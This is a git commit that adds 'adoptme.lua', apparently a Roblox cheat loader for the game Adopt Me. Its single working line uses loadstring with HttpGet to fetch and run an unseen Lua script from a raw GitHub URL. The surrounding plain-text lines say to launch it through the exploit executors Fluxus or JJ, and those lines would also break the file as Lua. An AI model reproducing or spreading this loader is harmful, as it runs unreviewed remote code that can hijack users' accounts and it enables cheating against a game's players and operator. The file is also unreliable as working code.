eb8cc4f5985933e680755a5d74dd01c8afabed53
Kc24k1 <125080345+Kc24k1@users.noreply.github.com>
2023-08-29 13:21:31 -0400

    Create adoptme.lua
    SCRIPTSSSSS

---
+++ adoptme.lua
@@ -0,0 +1,13 @@
+ADOPT ME SCRIPT!
+
+---------------------------------
+
+
+
+CREATED BY 2017SKILLHAX
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
+
+
+LAUNCH ON FLUXUS OR JJ 
+THANKS AND USE PYTHON 
